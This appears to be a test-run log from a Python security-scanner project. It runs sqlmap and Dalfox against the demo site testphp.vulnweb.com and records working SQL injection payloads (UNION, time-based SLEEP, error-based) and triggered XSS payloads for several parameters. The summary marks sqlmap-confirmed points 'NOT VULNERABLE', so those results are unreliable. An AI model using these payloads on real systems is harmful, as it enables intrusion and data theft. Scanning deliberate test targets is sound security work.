+2025-03-22 22:50:54,785 - INFO - root - Payload: artist=1 AND (SELECT 3723 FROM (SELECT(SLEEP(5)))fegO)
+2025-03-22 22:50:54,786 - INFO - root - 
+2025-03-22 22:50:54,786 - INFO - root - Type: UNION query
+2025-03-22 22:50:54,786 - INFO - root - Title: Generic UNION query (NULL) - 3 columns
+2025-03-22 22:50:54,787 - INFO - root - Payload: artist=-9946 UNION ALL SELECT NULL,CONCAT(0x71716b7171,0x64494243714a73597269544e4e584c6b7361486b696a58504d445264764c55574c73465a75447272,0x716b717071),NULL-- -
+2025-03-22 22:50:54,787 - INFO - root - ---
+2025-03-22 22:50:54,787 - INFO - root - [22:50:54] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:50:54,787 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:50:54,788 - INFO - root - web application technology: PHP 5.6.40, Nginx 1.19.0
+2025-03-22 22:50:54,788 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:50:54,788 - INFO - root - [22:50:54] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:50:54,789 - INFO - root - 
+2025-03-22 22:50:54,789 - INFO - root - [*] ending @ 22:50:54 /2025-03-22/
+2025-03-22 22:50:54,789 - INFO - root - 
+2025-03-22 22:50:54,859 - INFO - root - Scanning URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-03-22 22:50:54,859 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:50:55,885 - INFO - root - ___
+2025-03-22 22:50:55,886 - INFO - root - __H__
+2025-03-22 22:50:55,886 - INFO - root - ___ ___[']_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:50:55,887 - INFO - root - |_ -| . [)]     | .'| . |
+2025-03-22 22:50:55,887 - INFO - root - |___|_  [.]_|_|_|__,|  _|
+2025-03-22 22:50:55,887 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:50:55,888 - INFO - root - 
+2025-03-22 22:50:55,897 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:50:55,898 - INFO - root - 
+2025-03-22 22:50:55,898 - INFO - root - [*] starting @ 22:50:55 /2025-03-22/
+2025-03-22 22:50:55,898 - INFO - root - 
+2025-03-22 22:50:55,936 - INFO - root - [22:50:55] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:50:55,953 - INFO - root - [22:50:55] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.7.13) Gecko/20060411 Firefox/1.0.8 SUSE/1.0.8-0.2' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:50:56,004 - INFO - root - [22:50:56] [INFO] resuming back-end DBMS 'mysql'
+2025-03-22 22:50:56,010 - INFO - root - [22:50:56] [INFO] testing connection to the target URL
+2025-03-22 22:50:56,608 - INFO - root - sqlmap resumed the following injection point(s) from stored session:
+2025-03-22 22:50:56,609 - INFO - root - ---
+2025-03-22 22:50:56,609 - INFO - root - Parameter: cat (GET)
+2025-03-22 22:50:56,611 - INFO - root - Type: boolean-based blind
+2025-03-22 22:50:56,611 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:50:56,611 - INFO - root - Payload: cat=1 AND 9618=9618
+2025-03-22 22:50:56,612 - INFO - root - 
+2025-03-22 22:50:56,612 - INFO - root - Type: error-based
+2025-03-22 22:50:56,612 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:50:56,612 - INFO - root - Payload: cat=1 AND GTID_SUBSET(CONCAT(0x717a706271,(SELECT (ELT(2151=2151,1))),0x717a627671),2151)
+2025-03-22 22:50:56,613 - INFO - root - 
+2025-03-22 22:50:56,613 - INFO - root - Type: time-based blind
+2025-03-22 22:50:56,613 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+2025-03-22 22:50:56,614 - INFO - root - Payload: cat=1 AND (SELECT 4628 FROM (SELECT(SLEEP(5)))GBry)
+2025-03-22 22:50:56,614 - INFO - root - 
+2025-03-22 22:50:56,615 - INFO - root - Type: UNION query
+2025-03-22 22:50:56,615 - INFO - root - Title: Generic UNION query (NULL) - 11 columns
+2025-03-22 22:50:56,616 - INFO - root - Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x71526a636c6b5275426748594d41414e7a68697a7a487757485a63485053576144766672546f5865,0x717a627671),NULL-- -
+2025-03-22 22:50:56,616 - INFO - root - ---
+2025-03-22 22:50:56,616 - INFO - root - [22:50:56] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:50:56,617 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:50:56,617 - INFO - root - web application technology: PHP 5.6.40, Nginx 1.19.0
+2025-03-22 22:50:56,617 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:50:56,618 - INFO - root - [22:50:56] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:50:56,618 - INFO - root - 
+2025-03-22 22:50:56,618 - INFO - root - [*] ending @ 22:50:56 /2025-03-22/
+2025-03-22 22:50:56,619 - INFO - root - 
+2025-03-22 22:50:56,696 - INFO - root - Scanning URL: http://testphp.vulnweb.com/product.php?pic=1
+2025-03-22 22:50:56,696 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:50:57,820 - INFO - root - ___
+2025-03-22 22:50:57,821 - INFO - root - __H__
+2025-03-22 22:50:57,821 - INFO - root - ___ ___[,]_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:50:57,822 - INFO - root - |_ -| . [']     | .'| . |
+2025-03-22 22:50:57,822 - INFO - root - |___|_  [']_|_|_|__,|  _|
+2025-03-22 22:50:57,822 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:50:57,823 - INFO - root - 
+2025-03-22 22:50:57,832 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:50:57,833 - INFO - root - 
+2025-03-22 22:50:57,833 - INFO - root - [*] starting @ 22:50:57 /2025-03-22/
+2025-03-22 22:50:57,835 - INFO - root - 
+2025-03-22 22:50:57,875 - INFO - root - [22:50:57] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:50:57,891 - INFO - root - [22:50:57] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:50:57,941 - INFO - root - [22:50:57] [INFO] resuming back-end DBMS 'mysql'
+2025-03-22 22:50:57,947 - INFO - root - [22:50:57] [INFO] testing connection to the target URL
+2025-03-22 22:50:58,484 - INFO - root - sqlmap resumed the following injection point(s) from stored session:
+2025-03-22 22:50:58,485 - INFO - root - ---
+2025-03-22 22:50:58,485 - INFO - root - Parameter: pic (GET)
+2025-03-22 22:50:58,485 - INFO - root - Type: boolean-based blind
+2025-03-22 22:50:58,487 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:50:58,487 - INFO - root - Payload: pic=1 AND 4383=4383
+2025-03-22 22:50:58,488 - INFO - root - 
+2025-03-22 22:50:58,488 - INFO - root - Type: error-based
+2025-03-22 22:50:58,488 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:50:58,489 - INFO - root - Payload: pic=1 AND GTID_SUBSET(CONCAT(0x7176627a71,(SELECT (ELT(2968=2968,1))),0x7170786b71),2968)
+2025-03-22 22:50:58,489 - INFO - root - 
+2025-03-22 22:50:58,489 - INFO - root - Type: time-based blind
+2025-03-22 22:50:58,490 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+2025-03-22 22:50:58,490 - INFO - root - Payload: pic=1 AND (SELECT 3470 FROM (SELECT(SLEEP(5)))jBjc)
+2025-03-22 22:50:58,490 - INFO - root - 
+2025-03-22 22:50:58,490 - INFO - root - Type: UNION query
+2025-03-22 22:50:58,491 - INFO - root - Title: Generic UNION query (NULL) - 11 columns
+2025-03-22 22:50:58,492 - INFO - root - Payload: pic=-3852 UNION ALL SELECT NULL,NULL,CONCAT(0x7176627a71,0x52726f4573576b4a566e545a41506157554e5348624669775a554c7961777042716f445369416266,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+2025-03-22 22:50:58,492 - INFO - root - ---
+2025-03-22 22:50:58,493 - INFO - root - [22:50:58] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:50:58,493 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:50:58,493 - INFO - root - web application technology: PHP 5.6.40, Nginx 1.19.0
+2025-03-22 22:50:58,494 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:50:58,494 - INFO - root - [22:50:58] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:50:58,494 - INFO - root - 
+2025-03-22 22:50:58,494 - INFO - root - [*] ending @ 22:50:58 /2025-03-22/
+2025-03-22 22:50:58,495 - INFO - root - 
+2025-03-22 22:50:58,580 - INFO - security_api.sqlmap_test - 
+=== SQL Injection Scan Results ===
+2025-03-22 22:50:58,580 - INFO - security_api.sqlmap_test - 
+Target URL: http://testphp.vulnweb.com/artists.php?artist=1
+2025-03-22 22:50:58,581 - INFO - security_api.sqlmap_test - Status: NOT VULNERABLE
+2025-03-22 22:50:58,581 - INFO - security_api.sqlmap_test - --------------------------------------------------
+2025-03-22 22:50:58,581 - INFO - security_api.sqlmap_test - 
+Target URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-03-22 22:50:58,583 - INFO - security_api.sqlmap_test - Status: NOT VULNERABLE
+2025-03-22 22:50:58,583 - INFO - security_api.sqlmap_test - --------------------------------------------------
+2025-03-22 22:50:58,583 - INFO - security_api.sqlmap_test - 
+Target URL: http://testphp.vulnweb.com/product.php?pic=1
+2025-03-22 22:50:58,584 - INFO - security_api.sqlmap_test - Status: NOT VULNERABLE
+2025-03-22 22:50:58,584 - INFO - security_api.sqlmap_test - --------------------------------------------------
+2025-03-22 22:50:58,584 - INFO - security_api.__main__ - 
+Running CSRF Scanner test...
+2025-03-22 22:50:58,584 - INFO - security_api.test_csrf_scanner - Starting CSRF scan test...
+2025-03-22 22:50:58,586 - INFO - security_api.test_csrf_scanner - 
+Scanning domain: http://testphp.vulnweb.com
+2025-03-22 22:50:58,586 - INFO - security_api.csrf_scanner - Starting CSRF scan for domain: http://testphp.vulnweb.com
+2025-03-22 22:50:59,415 - INFO - security_api.test_csrf_scanner - 
+Scan Results:
+2025-03-22 22:50:59,416 - INFO - security_api.test_csrf_scanner - 
+Vulnerable Form Found at: http://testphp.vulnweb.com/search.php?test=query
+2025-03-22 22:50:59,416 - INFO - security_api.test_csrf_scanner - Method: post
+2025-03-22 22:50:59,416 - INFO - security_api.test_csrf_scanner - Risk Level: High
+2025-03-22 22:50:59,418 - INFO - security_api.test_csrf_scanner - 
+Missing Protections:
+2025-03-22 22:50:59,418 - INFO - security_api.test_csrf_scanner - - CSRF Token
+2025-03-22 22:50:59,418 - INFO - security_api.test_csrf_scanner - 
+Recommendations:
+2025-03-22 22:50:59,419 - INFO - security_api.test_csrf_scanner - - Implement CSRF tokens in all forms
+2025-03-22 22:50:59,419 - INFO - security_api.test_csrf_scanner - - Set SameSite=Strict for cookies
+2025-03-22 22:50:59,419 - INFO - security_api.test_csrf_scanner - - Use secure session management
+2025-03-22 22:50:59,420 - INFO - security_api.test_csrf_scanner - - Implement proper referrer checking
+2025-03-22 22:50:59,420 - INFO - security_api.__main__ - 
+Running SSRF Scanner test...
+2025-03-22 22:50:59,421 - INFO - security_api.test_ssrf_scanner - Starting SSRF scan test...
+2025-03-22 22:50:59,421 - INFO - security_api.test_ssrf_scanner - Starting SSRF scan for 3 URLs
+2025-03-22 22:50:59,422 - INFO - security_api.ssrf_scanner - Starting SSRF scan for 3 URLs
+2025-03-22 22:51:14,613 - INFO - security_api.test_ssrf_scanner - 
+Scan Results:
+2025-03-22 22:51:14,614 - INFO - security_api.test_ssrf_scanner - No SSRF vulnerabilities found.
+2025-03-22 22:51:14,614 - INFO - security_api.__main__ - 
+Running Dalfox XSS Scanner test...
+2025-03-22 22:51:14,615 - INFO - security_api.test_dalfox_scanner - Starting Dalfox XSS scan test...
+2025-03-22 22:51:14,615 - INFO - security_api.test_dalfox_scanner - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:51:14,616 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_225114.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_225114.txt --follow-redirects --mining-dict --mining-dom --silence --mass
+2025-03-22 22:51:56,874 - INFO - security_api.dalfox_scanner - Dalfox stdout: [
+{"type":"G","inject_type":"BUILTIN","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=%27","param":"","payload":"toGrepping","evidence":"","cwe":"","severity":"Low","message_id":8,"message_str":"Found dalfox-error-mysql via built-in grepping / payload: toGrepping"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=query%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E","param":"test","payload":"'\"\u003e\u003cimg/src/onerror=.1|alert``\u003e","evidence":"49 line:   syntax to use near '\"\u003e\u003cimg/src/onerror=.1|alert``\u003e'' at line 1","cwe":"CWE-79","severity":"Medium","message_id":255,"message_str":"Reflected Payload in HTML: test='\"\u003e\u003cimg/src/onerror=.1|alert``\u003e"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=query%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E","param":"test","payload":"'\u003e\u003csVg/onload=alert(1) class=dalfox\u003e","evidence":"49 line:   syntax to use near '\u003e\u003csVg/onload=alert(1) class=dalfox\u003e'' at line 1","cwe":"CWE-79","severity":"High","message_id":183,"message_str":"Triggered XSS Payload (found DOM Object): test='\u003e\u003csVg/onload=alert(1) class=dalfox\u003e"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3Easd","param":"artist","payload":"\"\u003easd","evidence":"49 line:  syntax to use near '\"\u003easd' at line 1","cwe":"CWE-79","severity":"Medium","message_id":689,"message_str":"Reflected Payload in HTML: artist=\"\u003easd"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E","param":"artist","payload":"\"\u003e\u003csvg/OnLoad=\"`${prompt``}`\" class=dalfox\u003e","evidence":"49 line:  syntax to use near '\"\u003e\u003csvg/OnLoad=\"`${prompt``}`\" class=dalfox\u003e' at line 1","cwe":"CWE-79","severity":"High","message_id":613,"message_str":"Triggered XSS Payload (found DOM Object): artist=\"\u003e\u003csvg/OnLoad=\"`${prompt``}`\" class=dalfox\u003e"},
+{}]
+
+2025-03-22 22:51:56,878 - ERROR - security_api.dalfox_scanner - Dalfox stderr: [37m[*] [0mParallel testing to 'testphp.vulnweb.com' => 4 urls
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:51:21 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:51:49 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:51:56 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:51:56 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:51:56 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+[37m[*] [0mFinish massive scan!
+
+2025-03-22 22:51:56,882 - INFO - security_api.test_dalfox_scanner - 
+Scan Results:
+2025-03-22 22:51:56,883 - INFO - security_api.test_dalfox_scanner - 
+Found 5 XSS vulnerabilities:
+2025-03-22 22:51:56,883 - INFO - security_api.test_dalfox_scanner - 
+=== Vulnerability #1 ===
+2025-03-22 22:51:56,884 - INFO - security_api.test_dalfox_scanner - URL: 
+2025-03-22 22:51:56,884 - INFO - security_api.test_dalfox_scanner - Parameter: 
+2025-03-22 22:51:56,884 - INFO - security_api.test_dalfox_scanner - Severity: High
+2025-03-22 22:51:56,885 - INFO - security_api.test_dalfox_scanner - Payload: 
+2025-03-22 22:51:56,885 - INFO - security_api.test_dalfox_scanner - 
+Details:
+2025-03-22 22:51:56,886 - INFO - security_api.test_dalfox_scanner - Description: Cross-Site Scripting vulnerability found in parameter ''
+2025-03-22 22:51:56,886 - INFO - security_api.test_dalfox_scanner - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:51:56,887 - INFO - security_api.test_dalfox_scanner - 
+Mitigation Steps:
+2025-03-22 22:51:56,887 - INFO - security_api.test_dalfox_scanner -   1. Sanitize input for parameter ''
+2025-03-22 22:51:56,887 - INFO - security_api.test_dalfox_scanner -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:51:56,888 - INFO - security_api.test_dalfox_scanner -   3. Use HTML encoding for dynamic content
+2025-03-22 22:51:56,888 - INFO - security_api.test_dalfox_scanner -   4. Validate input against whitelist
+2025-03-22 22:51:56,889 - INFO - security_api.test_dalfox_scanner - 
+=== Vulnerability #2 ===
+2025-03-22 22:51:56,890 - INFO - security_api.test_dalfox_scanner - URL: 
+2025-03-22 22:51:56,890 - INFO - security_api.test_dalfox_scanner - Parameter: test
+2025-03-22 22:51:56,890 - INFO - security_api.test_dalfox_scanner - Severity: High
+2025-03-22 22:51:56,891 - INFO - security_api.test_dalfox_scanner - Payload: 
+2025-03-22 22:51:56,891 - INFO - security_api.test_dalfox_scanner - 
+Details:
+2025-03-22 22:51:56,892 - INFO - security_api.test_dalfox_scanner - Description: Cross-Site Scripting vulnerability found in parameter 'test'
+2025-03-22 22:51:56,892 - INFO - security_api.test_dalfox_scanner - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:51:56,892 - INFO - security_api.test_dalfox_scanner - 
+Mitigation Steps:
+2025-03-22 22:51:56,894 - INFO - security_api.test_dalfox_scanner -   1. Sanitize input for parameter 'test'
+2025-03-22 22:51:56,894 - INFO - security_api.test_dalfox_scanner -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:51:56,895 - INFO - security_api.test_dalfox_scanner -   3. Use HTML encoding for dynamic content
+2025-03-22 22:51:56,895 - INFO - security_api.test_dalfox_scanner -   4. Validate input against whitelist
+2025-03-22 22:51:56,896 - INFO - security_api.test_dalfox_scanner - 
+=== Vulnerability #3 ===
+2025-03-22 22:51:56,896 - INFO - security_api.test_dalfox_scanner - URL: 
+2025-03-22 22:51:56,898 - INFO - security_api.test_dalfox_scanner - Parameter: test
+2025-03-22 22:51:56,898 - INFO - security_api.test_dalfox_scanner - Severity: High
+2025-03-22 22:51:56,898 - INFO - security_api.test_dalfox_scanner - Payload: 
+2025-03-22 22:51:56,899 - INFO - security_api.test_dalfox_scanner - 
+Details:
+2025-03-22 22:51:56,899 - INFO - security_api.test_dalfox_scanner - Description: Cross-Site Scripting vulnerability found in parameter 'test'
+2025-03-22 22:51:56,900 - INFO - security_api.test_dalfox_scanner - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:51:56,900 - INFO - security_api.test_dalfox_scanner - 
+Mitigation Steps:
+2025-03-22 22:51:56,901 - INFO - security_api.test_dalfox_scanner -   1. Sanitize input for parameter 'test'
+2025-03-22 22:51:56,901 - INFO - security_api.test_dalfox_scanner -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:51:56,902 - INFO - security_api.test_dalfox_scanner -   3. Use HTML encoding for dynamic content
+2025-03-22 22:51:56,902 - INFO - security_api.test_dalfox_scanner -   4. Validate input against whitelist
+2025-03-22 22:51:56,902 - INFO - security_api.test_dalfox_scanner - 
+=== Vulnerability #4 ===
+2025-03-22 22:51:56,903 - INFO - security_api.test_dalfox_scanner - URL: 
+2025-03-22 22:51:56,904 - INFO - security_api.test_dalfox_scanner - Parameter: artist
+2025-03-22 22:51:56,904 - INFO - security_api.test_dalfox_scanner - Severity: High
+2025-03-22 22:51:56,905 - INFO - security_api.test_dalfox_scanner - Payload: 
+2025-03-22 22:51:56,905 - INFO - security_api.test_dalfox_scanner - 
+Details:
+2025-03-22 22:51:56,905 - INFO - security_api.test_dalfox_scanner - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:51:56,906 - INFO - security_api.test_dalfox_scanner - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:51:56,906 - INFO - security_api.test_dalfox_scanner - 
+Mitigation Steps:
+2025-03-22 22:51:56,907 - INFO - security_api.test_dalfox_scanner -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:51:56,907 - INFO - security_api.test_dalfox_scanner -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:51:56,908 - INFO - security_api.test_dalfox_scanner -   3. Use HTML encoding for dynamic content
+2025-03-22 22:51:56,908 - INFO - security_api.test_dalfox_scanner -   4. Validate input against whitelist
+2025-03-22 22:51:56,909 - INFO - security_api.test_dalfox_scanner - 
+=== Vulnerability #5 ===
+2025-03-22 22:51:56,909 - INFO - security_api.test_dalfox_scanner - URL: 
+2025-03-22 22:51:56,910 - INFO - security_api.test_dalfox_scanner - Parameter: artist
+2025-03-22 22:51:56,910 - INFO - security_api.test_dalfox_scanner - Severity: High
+2025-03-22 22:51:56,911 - INFO - security_api.test_dalfox_scanner - Payload: 
+2025-03-22 22:51:56,911 - INFO - security_api.test_dalfox_scanner - 
+Details:
+2025-03-22 22:51:56,911 - INFO - security_api.test_dalfox_scanner - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:51:56,911 - INFO - security_api.test_dalfox_scanner - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:51:56,912 - INFO - security_api.test_dalfox_scanner - 
+Mitigation Steps:
+2025-03-22 22:51:56,913 - INFO - security_api.test_dalfox_scanner -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:51:56,913 - INFO - security_api.test_dalfox_scanner -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:51:56,913 - INFO - security_api.test_dalfox_scanner -   3. Use HTML encoding for dynamic content
+2025-03-22 22:51:56,914 - INFO - security_api.test_dalfox_scanner -   4. Validate input against whitelist
+2025-03-22 22:51:56,914 - INFO - security_api.test_dalfox_scanner - 
+=== General Recommendations ===
+2025-03-22 22:51:56,915 - INFO - security_api.test_dalfox_scanner - - Implement proper input validation and output encoding
+2025-03-22 22:51:56,915 - INFO - security_api.test_dalfox_scanner - - Use Content Security Policy (CSP) headers
+2025-03-22 22:51:56,916 - INFO - security_api.test_dalfox_scanner - - Sanitize user input before rendering
+2025-03-22 22:51:56,916 - INFO - security_api.test_dalfox_scanner - - Use security frameworks or libraries for XSS protection
+2025-03-22 22:51:56,917 - INFO - security_api.test_dalfox_scanner - - Implement proper HTML escaping for dynamic content
+2025-03-22 22:51:56,917 - INFO - security_api.__main__ - 
+=== Test Results Summary ===
+2025-03-22 22:51:56,918 - INFO - security_api.__main__ - SQLMap Scanner: PASSED
+2025-03-22 22:51:56,918 - INFO - security_api.__main__ - CSRF Scanner: FAILED
+2025-03-22 22:51:56,919 - INFO - security_api.__main__ - SSRF Scanner: FAILED
+2025-03-22 22:51:56,919 - INFO - security_api.__main__ - Dalfox XSS Scanner: FAILED
+2025-03-22 22:55:17,541 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:55:17,545 - INFO - security_api.__main__ - Starting Dalfox XSS scan test...
+2025-03-22 22:55:17,546 - INFO - security_api.__main__ - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:55:17,547 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_225517.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_225517.txt --follow-redirects --mining-dict --mining-dom --silence --mass
+2025-03-22 22:55:58,686 - INFO - security_api.dalfox_scanner - Dalfox stdout: [
+{"type":"G","inject_type":"BUILTIN","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=%27+or+","param":"","payload":"toGrepping","evidence":"","cwe":"","severity":"Low","message_id":77,"message_str":"Found dalfox-error-mysql5 via built-in grepping / payload: toGrepping"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=query%27%3E%3CsVg%2Fonload%3Dalert%281%29+id%3Ddalfox%3E","param":"test","payload":"'\u003e\u003csVg/onload=alert(1) id=dalfox\u003e","evidence":"49 line:   syntax to use near '\u003e\u003csVg/onload=alert(1) id=dalfox\u003e'' at line 1","cwe":"CWE-79","severity":"High","message_id":179,"message_str":"Triggered XSS Payload (found DOM Object): test='\u003e\u003csVg/onload=alert(1) id=dalfox\u003e"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%27%22%3E%3Csvg%2Fonload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f","param":"artist","payload":"'\"\u003e\u003csvg/onload=\u0026#97\u0026#108\u0026#101\u0026#114\u0026#00116\u0026#40\u0026#41\u0026#x2f\u0026#x2f","evidence":"49 line:  syntax to use near ''\"\u003e\u003csvg/onload=\u0026#97\u0026#108\u0026#101\u0026#114\u0026#00116\u0026#40\u0026#41\u0026#x2f\u0026#x2f'","cwe":"CWE-79","severity":"Medium","message_id":657,"message_str":"Reflected Payload in HTML: artist='\"\u003e\u003csvg/onload=\u0026#97\u0026#108\u0026#101\u0026#114\u0026#00116\u0026#40\u0026#41\u0026#x2f\u0026#x2f"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E","param":"artist","payload":"\"\u003e\u003cimg/src/onerror=.1|alert`` class=dalfox\u003e","evidence":"49 line:  syntax to use near '\"\u003e\u003cimg/src/onerror=.1|alert`` class=dalfox\u003e' at line 1","cwe":"CWE-79","severity":"High","message_id":621,"message_str":"Triggered XSS Payload (found DOM Object): artist=\"\u003e\u003cimg/src/onerror=.1|alert`` class=dalfox\u003e"},
+{}]
+
+2025-03-22 22:55:58,688 - ERROR - security_api.dalfox_scanner - Dalfox stderr: [37m[*] [0mParallel testing to 'testphp.vulnweb.com' => 4 urls
